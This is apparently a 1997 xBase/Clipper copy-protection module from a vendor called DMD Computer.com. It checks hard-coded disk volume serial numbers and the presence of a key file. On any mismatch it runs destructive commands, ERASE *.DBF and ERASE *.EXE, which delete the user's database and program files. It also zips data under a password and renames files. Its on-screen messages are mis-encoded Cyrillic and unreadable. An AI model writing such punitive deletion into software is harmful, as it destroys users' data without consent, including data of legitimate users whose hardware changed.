*************************************************************************
*                     DMD Computer.com (c)1997, DPP                     *
*************************************************************************

********************************* START *********************************

CLEAR
CLOSE ALL
D1 := '2C33-1305'
D2 := '1EA6-2765'
D3 := '3134-1EE1'


********************************* FILE

LP := 0

FLE = 'KAR'
FLE = FLE + 'T5.JTX'

IF !FILE(FLE)
        LP = 1
ENDIF

IF (LP=1)
        SET CURSOR OFF
        SET COLOR TO W+*/B
        @ 2, 0 SAY '      š±Č„Ź Č  ­„ „ Șź­ŽšŁł°š° ­  Ż° ąš«­ź -     !!!      '
        SET COLOR TO
        @ 3, 0 SAY '      Ą €„Č„ ±„ ­  -DMD Computer.com- , Ł°. źą   Łź° , Č„«: 0457-23263       '
        @ 4, 0 SAY '                   e-mail: dmd-computer.com@bulmail.gocis.bg                    '
        SET COLOR TO
        ERASE *.EXE
        IF FILE(FLE)
                FRENAME('KART5.JTX', 'COOP.EXE')
        ENDIF
        QUIT
ENDIF

*********************************************** HACKERS

NN := '2C3'
NN := NN + '3-13'
NN := NN + '05'

MM := '1'
MM := MM + 'EA6-'
MM := MM + '27'
MM := MM + '65'

IF D1<>NN .OR. D2<>MM
        ERASE *.EXE
        SET CURSOR OFF
        SET COLOR TO W+*/B
        @ 2, 0 SAY '                š±Č„Ź Č  źČȘ°šą  ­„źČź°š§š° ­  ­ Ź„±  ą ­„ż !!!                '
        SET COLOR TO
        @ 3, 0 SAY '      Ą €„Č„ ±„ ­  -DMD Computer.com- , Ł°. źą   Łź° , Č„«: 0457-23263       '
        @ 4, 0 SAY '                   e-mail: dmd-computer.com@bulmail.gocis.bg                    '
        SET COLOR TO
        FRENAME('KART5.JTX', 'COOP.EXE')
        !PKZIP paridmd -sdmdpari
        ERASE *.DBF
        ERASE *.EXE
        QUIT
ENDIF

*********************************************** NOMER

!DIR > DIR.TXT
AA  := MEMOREAD("DIR.TXT")
AA1 := MEMOLINE(AA,41,3)
AA2  = SUBSTR(AA1,26,9)
FCREATE('DIR.TXT')
FERASE('DIR.TXT')

DA1 := '2C3'
DA1 := DA1 + '3-13'
DA1 := DA1 + '05'

DA2 := '1'
DA2 := DA2 + 'EA6-'
DA2 := DA2 + '27'
DA2 := DA2 + '65'

IF (AA2=DA1 .OR. AA2=DA2)
        @ 22, 8 SAY '     !!! '
ELSE
        SET CURSOR OFF
        SET COLOR TO W+*/B
        @ 2, 0 SAY '    š„ ­„ ŹźŠ„Č„ €  ° ĄźČšČ„ ± Čź§š Ż°ź€łȘČ -      !!!     '
        SET COLOR TO
        @ 3, 0 SAY '      Ą €„Č„ ±„ ­  -DMD Computer.com- , Ł°. źą   Łź° , Č„«: 0457-23263       '
        @ 4, 0 SAY '                   e-mail: dmd-computer.com@bulmail.gocis.bg                    '
        SET COLOR TO
        ERASE *.EXE
        FRENAME('KART5.JTX', 'COOP.EXE')
        QUIT
ENDIF


RETURN
****************************************  END
